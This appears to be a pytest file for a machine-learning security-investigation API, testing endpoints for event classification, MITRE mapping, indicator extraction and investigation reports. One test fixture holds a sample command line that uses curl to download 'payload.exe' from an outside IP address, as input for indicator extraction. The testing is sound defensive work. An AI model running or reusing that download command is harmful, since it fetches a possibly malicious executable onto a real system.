"""Tests for ML investigation API endpoints."""


def test_classify_event(client, sample_event):
    r = client.post("/ml/classify", json={"event": sample_event})
    assert r.status_code == 200
    data = r.json()
    assert "label" in data
    assert "confidence" in data
    assert 0 <= data["confidence"] <= 1


def test_mitre_map(client, sample_event):
    r = client.post("/ml/mitre-map", json={"event": sample_event})
    assert r.status_code == 200
    data = r.json()
    assert isinstance(data, list)


def test_extract_iocs(client):
    event = {
        "command_line": "curl http://185.220.101.45/payload.exe",
        "destination_ip": "10.0.0.1",
        "process_name": "curl.exe",
    }
    r = client.post("/ml/extract-iocs", json={"event": event})
    assert r.status_code == 200
    data = r.json()
    assert isinstance(data, list)


def test_engine_info(client):
    r = client.get("/ml/engine-info")
    assert r.status_code == 200
    data = r.json()
    assert "event_classifier_loaded" in data


def test_list_investigations(client):
    r = client.get("/ml/investigations")
    assert r.status_code == 200
    data = r.json()
    assert "investigations" in data


def test_investigate_example(client):
    r = client.post("/ml/investigate/example")
    assert r.status_code == 200
    data = r.json()
    assert "incident_id" in data
    assert "threat_level" in data
    assert "threat_score" in data
